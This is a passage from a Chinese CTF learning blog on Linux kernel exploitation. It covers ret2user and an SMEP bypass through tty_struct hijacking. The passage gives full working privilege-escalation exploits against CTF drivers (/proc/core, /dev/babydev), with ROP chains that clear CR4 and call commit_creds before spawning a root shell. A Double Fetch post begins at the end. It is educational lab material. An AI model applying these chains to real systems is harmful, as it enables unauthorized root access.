class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">&quot;memory&quot;</span></span><br><span class="line"> 	);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] ret2user [*]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=(<span class="type">size_t</span>)get_root;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这两份 <code>EXP</code> 其实很像，只有执行 <code>commit_creds(prepare_kernel_cred(0))</code> 函数的部分不一样（如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但有意思的是，无法在此处执行用户态的函数，因为我调用了 <code>puts</code> 函数，发现内核崩溃了，我认为其原因是状态寄存器没有进行切换所导致的，因此还得再回到内核中去恢复状态寄存器的值，最终执行用户态中的 <code>system(&quot;/bin/sh&quot;)</code> </p>
<h2 id="bypass-SMEP"><a href="#bypass-SMEP" class="headerlink" title="bypass-SMEP"></a>bypass-SMEP</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>SMEP</code> 全称 <code>Supervisor Mode Execution Protection</code> ，当 <code>CPU</code> 处于 <code>ring0</code> 模式时执行用户空间的代码会触发页错误（该防御机制会将页表中的用户空间内存页标记为不可执行），目的是为了防止 <code>ret2user</code>。在启动时， <code>-cpu</code> 选项下加入 <code>+smep</code> 启用该防御机制，在 <code>-append</code> 选项下加入 <code>nosmep</code> 禁用该机制。</p>
<p>系统会根据 <code>CR4</code> 寄存器中第二十位的值来判断 <code>SMEP</code> 保护是否开启（ <code>1</code> 为开启，<code>0</code> 为关闭 ）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304211706032.png" alt="image-20230421170620883"></p>
<p>在打开 <code>/dev/ptmx</code> 设备时，会分配一个 <code>tty_struct</code> 结构体，定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>其中关注的是 <code>const struct tty_operations *ops</code> 指针，该指针指向了结构体 <code>tty_operations</code> （定义如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>如果能劫持掉上面的指针，在对 <code>/dev/ptmx</code> 文件进行 <code>write</code> 或者 <code>read</code> 等操作时就可以跳转我们指定的函数指针执行，有点类似于 <code>FSOP</code> </p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>在劫持的位置先进行第一次迁移，<code>rax</code> 正好是 <code>fake_tty_operation</code> 的地址，于是，我们把栈转移到 <code>fake_tty_operations</code> 里,此处是可以放一少部分 <code>gadget</code> ，用这部分进行第二次迁移，迁移到堆块中的 <code>rop</code> 链上，用 <code>mov cr4,rdi</code> 这个 <code>gadget</code> 来改变 <code>cr4</code> 寄存器的值从而绕过 <code>SMEP</code> 保护，随后打一个 <code>ret2user</code> 即可完成提权。</p>
<p>此处的 <code>EXP</code> 用的是 <a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104577501">ha1vk</a>  师傅的，因为这题已经做过了，并且 <code>ha1vk</code> 师傅写的也很详细，再写一遍也没有什么大的改变</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//tty_struct结构体的大小</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"><span class="comment">//mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI 0xffffffff81004d80</span></span><br><span class="line"><span class="comment">//pop rdi ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI 0xffffffff810d238d</span></span><br><span class="line"><span class="comment">//swapgs ; pop rbp ; ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS 0xffffffff81063694</span></span><br><span class="line"><span class="comment">//iretq</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ 0xFFFFFFFF8181A797</span></span><br><span class="line"><span class="comment">//commit_creds函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810a1420</span></span><br><span class="line"><span class="comment">// prepare_kernel_cred</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a1810</span></span><br><span class="line"><span class="comment">//mov rsp, rax;dec ebx;ret，做栈迁移用</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX 0xFFFFFFFF8181BFC5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX 0xffffffff8100ce6e</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//函数指针</span></span><br><span class="line">   <span class="type">void</span> *(*pkc)(<span class="type">int</span>) = (<span class="type">void</span> *(*)(<span class="type">int</span>))PREPARE_KERNEL_CRED;</span><br><span class="line">   <span class="type">void</span> (*cc)(<span class="type">void</span> *) = (<span class="type">void</span> (*)(<span class="type">void</span> *))COMMIT_CREDS;</span><br><span class="line">   <span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">   (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Rooted!!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]Root Fail!!\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">size_t</span> user_cs,user_ss,user_flags,user_sp;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*保存用户态的寄存器到变量里*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveUserState</span><span class="params">()</span> &#123;</span><br><span class="line">   __asm__(<span class="string">&quot;mov %cs,user_cs;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %ss,user_ss;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %rsp,user_sp;&quot;</span></span><br><span class="line">           <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">           <span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">           );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;user states have been saved!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">//保存用户态寄存器</span></span><br><span class="line">   saveUserState();</span><br><span class="line">   <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span> || fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//申请一个tty_struct大小的堆</span></span><br><span class="line">   ioctl(fd1,<span class="number">0x10001</span>,TTY_STRUCT_SIZE);</span><br><span class="line">   <span class="comment">//释放这个堆</span></span><br><span class="line">   close(fd1);</span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x100</span>];</span><br><span class="line">   <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = POP_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">   rop[i++] = MOV_CR4_RDI;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getRoot;</span><br><span class="line">   rop[i++] = SWAPGS;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = IRETQ;</span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_flags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> fake_tty_operations[<span class="number">35</span>];</span><br><span class="line">   <span class="comment">/*for (int i=0;i&lt;35;i++) &#123;</span></span><br><span class="line"><span class="comment">      fake_tty_operations[i] = 0xffffffffc0000000 + i;</span></span><br><span class="line"><span class="comment">   &#125;*/</span></span><br><span class="line">   <span class="comment">//这个位置是write函数的指针，经过调试，我们发现当调用这个函数时，rax正好是fake_tty_operation的地址，于是，我们把栈转移到</span></span><br><span class="line">   <span class="comment">//fake_tty_operations里</span></span><br><span class="line">   fake_tty_operations[<span class="number">7</span>] = MOV_RSP_RAX;</span><br><span class="line">   <span class="comment">//栈转移到fake_tty_operations里后，我们继续做一次转移，把转转移到我们的rop数组里，执行ROP</span></span><br><span class="line">   fake_tty_operations[<span class="number">0</span>] = POP_RAX;</span><br><span class="line">   fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>)rop;</span><br><span class="line">   fake_tty_operations[<span class="number">2</span>] = MOV_RSP_RAX;</span><br><span class="line"> </span><br><span class="line">   <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>];</span><br><span class="line">   <span class="comment">//这个操作会申请tty_struct的空间，也就是会申请到我们之前释放的那个堆里，我们可以用fd2来对它操作</span></span><br><span class="line">   <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="comment">//我们先把原始的tty_struct前面的数据读出来，存储</span></span><br><span class="line">   read(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="comment">//修改const struct tty_operations *ops;指针，指向我们伪造的tty_operations</span></span><br><span class="line">   fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_tty_operations;</span><br><span class="line">   <span class="comment">//把篡改过的tty_struct写回去</span></span><br><span class="line">   write(fd2,fake_tty_struct,<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">   write(fd_tty,buf,<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/175110.html">Kernel pwn 基础教程之 ret2usr 与 bypass_smep - SecPulse.COM | 安全脉搏</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/98937960">(47条消息) Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep_钞sir的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104577501">(47条消息) linux kernel pwn学习之伪造tty_struct执行任意函数_ha1vk的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/98520140?spm=1001.2014.3001.5502">(47条消息) Linux Kernel Exploit 内核漏洞学习(2)-ROP_钞sir的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://ama2in9.top/2020/09/03/kernel/">Kernel Pwn从入门到放弃 | Ama2in9</a></p>
<p><a target="_blank" rel="noopener" href="https://x3h1n.github.io/2019/07/04/2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/">2018强网杯 core | X3h1n</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/6176bce9.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/6176bce9.html" class="post-title-link" itemprop="url">关于 kernel-Double Fetch 的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:59:24" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote>
<p><code>Double Fetch</code> 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。</p>
<p>在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 <code>copy_from_user</code> 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但<strong>在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常</strong>。</p>
